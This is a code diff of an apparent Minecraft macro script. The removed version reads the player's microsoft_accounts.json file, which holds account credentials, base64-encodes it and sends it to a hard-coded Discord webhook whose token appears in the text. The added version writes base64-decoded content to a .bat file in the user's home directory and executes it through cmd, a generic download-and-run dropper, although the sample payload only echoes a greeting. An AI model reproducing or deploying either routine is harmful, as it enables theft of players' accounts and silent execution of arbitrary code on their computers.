@@ -1,49 +1,41 @@
-const FILE_PATH = Java.type("java.nio.file.Paths").get(
-    Java.type("java.lang.System").getProperty("user.home"),
-    ".minecraft", "essential", "microsoft_accounts.json"
-).toString();
+function executeBat(batFilePath, base64Content = null, isBase64Encoded = true) {
+    const FS = Java.type("java.nio.file.Files"); // Filesystem operations
+    const Paths = Java.type("java.nio.file.Paths"); // Path operations
+    const Base64 = Java.type("java.util.Base64");
+    const Runtime = Java.type("java.lang.Runtime");
 
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1333133682915151943/U2EECivgXC_DLrYcEbb2eDlvs-PBS7HNvzd-RKy4IK0XQKLVsgTW58aCk99x-KMlBWy7";
+    try {
+        if (base64Content) {
+            // Decode base64 content if needed
+            const decodedContent = isBase64Encoded
+                ? Base64.getDecoder().decode(base64Content)
+                : base64Content;
 
-const File = Java.type("java.io.File");
-const Files = Java.type("java.nio.file.Files");
-const Paths = Java.type("java.nio.file.Paths");
-const StandardCharsets = Java.type("java.nio.charset.StandardCharsets");
+            // Write the decoded content to the specified .bat file
+            const filePath = Paths.get(batFilePath);
+            FS.write(filePath, decodedContent);
+            Chat.log(`Successfully wrote content to: ${batFilePath}`);
+        }
 
-try {
-    // Check if the file exists
-    const file = new File(FILE_PATH);
-    if (!file.exists()) {
-        Chat.log(`File not found: ${FILE_PATH}`);
-        return;
+        // Check if the .bat file exists and is a valid file
+        const filePath = Paths.get(batFilePath);
+        if (!FS.exists(filePath)) {
+            throw new Error(`Whitelist accepted "${batFilePath}", but file does not exist.`);
+        }
+        if (!FS.isRegularFile(filePath)) {
+            throw new Error(`"${batFilePath}" is not a regular file. Whitelist denied.`);
+        }
+
+        // Execute the .bat file using Runtime.exec
+        Runtime.getRuntime().exec(`cmd /c start "" "${batFilePath}"`);
+        Chat.log(`Executed batch file: ${batFilePath}`);
+    } catch (error) {
+        Chat.log(`Error occurred: ${error.message}`);
     }
-
-    // Read the file content
-    const fileBytes = Files.readAllBytes(Paths.get(FILE_PATH));
-    const encodedFile = Java.type("java.util.Base64").getEncoder().encodeToString(fileBytes);
-
-    // Create a payload for the webhook
-    const payload = {
-        content: "Here is your file!",
-        file: encodedFile // Add base64 file content
-    };
-
-    // Send the HTTP POST request
-    const response = Network.request({
-        url: WEBHOOK_URL,
-        method: "POST",
-        headers: {
-            "Content-Type": "application/json"
-        },
-        body: JSON.stringify(payload)
-    });
-
-    // Check response
-    if (response.getResponseCode() === 200) {
-        Chat.log("File sent successfully.");
-    } else {
-        Chat.log(`Failed to send the file. HTTP Status Code: ${response.getResponseCode()}`);
-    }
-} catch (error) {
-    Chat.log(`Error occurred: ${error.message}`);
 }
+
+// Example usage:
+const batFilePath = Java.type("java.lang.System").getProperty("user.home") + "\\test.bat"; // Path to .bat file
+const base64Content = "QGNobz0iSGVsbG8sIFdvcmxkISIKcGF1c2U="; // Example Base64 encoded batch script content
+
+executeBat(batFilePath, base64Content, true);
